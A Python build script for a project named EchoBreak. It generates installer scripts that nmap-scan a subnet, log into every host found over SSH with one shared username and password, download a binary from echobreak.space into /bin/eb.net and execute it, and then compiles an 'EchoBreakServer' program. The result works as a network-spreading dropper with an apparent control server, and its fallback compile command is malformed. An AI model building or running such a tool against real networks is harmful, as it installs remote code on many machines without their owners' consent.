import os

username = str(input("enter the username: "))
password = str(input("enter the password for your user: "))
ip_count = int(input("how many ip subnets you have: "))

os.system("rm -rf build")
os.mkdir("build")

# installers
for i in range(ip_count):
    net_range = str(input(f"enter the network range {i+1} like 172.17.212.0/24: "))
    with open(f"build/installer{i}", "a") as f:
        f.write(f"""import subprocess
import ipaddress
import paramiko
from tqdm import tqdm
import time

# Конфигурация
NETWORK_RANGE = "{net_range}"  # Измени под свою сеть
SSH_USERNAME = "{username}"
SSH_PASSWORD = "{password}"
FILE_URL = "https://echobreak.space/downloads/eb.net"  # Файл, который нужно скачать
TARGET_PATH = "/bin/eb.net"


def get_local_devices(network_range):
    print("[*] Сканируем сеть...")
    devices = []

    with tqdm(total=100, desc="Сканирование сети", bar_format="{{l_bar}}{{bar}} [ осталось: {{remaining}} ]") as pbar:
        result = subprocess.run([
            "nmap", "-sn", network_range
        ], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        lines = result.stdout.splitlines()
        for line in lines:
            if "Nmap scan report for" in line:
                ip = line.split()[-1]
                if not ip.startswith("localhost") and not ip.endswith(".1"):
                    devices.append(ip)
            pbar.update(5)
            time.sleep(0.01)  # Имитация задержки

    return devices


def download_and_run(ip, username, password, file_url, target_path):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Подключение с прогресс-баром
        with tqdm(total=100, desc=f"Подключение к {{ip}}", leave=False) as pbar:
            ssh.connect(ip, username=username, password=password, timeout=5)
            pbar.update(30)

            # Скачивание файла
            stdin, stdout, stderr = ssh.exec_command(f"curl -o {{target_path}} {{file_url}}")
            pbar.update(40)
            stdout.read(), stderr.read()

            # Выполнение команд
            stdin, stdout, stderr = ssh.exec_command(f"chmod +x {{target_path}} && {{target_path}}")
            pbar.update(30)

            ssh.close()
    except Exception as e:
        tqdm.write(f"[!] Не удалось подключиться к {{ip}}: {{e}}")


if __name__ == "__main__":
    devices = get_local_devices(NETWORK_RANGE)
    print(f"[*] Найдено устройств в сети: {{len(devices)}}")

    # Прогресс-бар по всем устройствам
    for ip in tqdm(devices, desc="Обработка устройств", total=len(devices)):
        download_and_run(ip, SSH_USERNAME, SSH_PASSWORD, FILE_URL, TARGET_PATH)

    print("[*] Завершено.")
""")
        

#EBS
try:
    os.system("g++ source/EchoBreakServer.cpp -pthread -o EBS")
except:
    os.system("c++ -std=c++17 g++source/EchoBreakServer.cpp -o EBS")

os.system("mv EBS build")